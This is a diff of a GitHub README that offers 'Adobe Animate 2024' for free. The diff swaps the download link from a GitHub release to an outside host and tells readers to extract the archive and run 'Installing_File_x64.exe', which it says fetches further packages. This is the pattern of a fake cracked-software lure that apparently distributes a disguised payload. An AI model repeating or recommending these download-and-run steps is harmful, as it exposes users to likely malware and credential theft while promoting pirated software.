@@ -12,11 +12,11 @@ Tags: Adobe Animate 2024 free. Download Adobe Animate for free. Download free Ad
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/86a3e670-2ace-40b6-9f3c-c0802d3160dc)
-](https://github.com/subrahmanyaug/Adobe-Animate-2024/releases/download/V4.59/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/subrahmanyaug/Adobe-Animate-2024/releases/download/V4.59/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![fG2qCrb](https://github.com/user-attachments/assets/046b4a55-f87c-4b0b-afff-371db893afee)
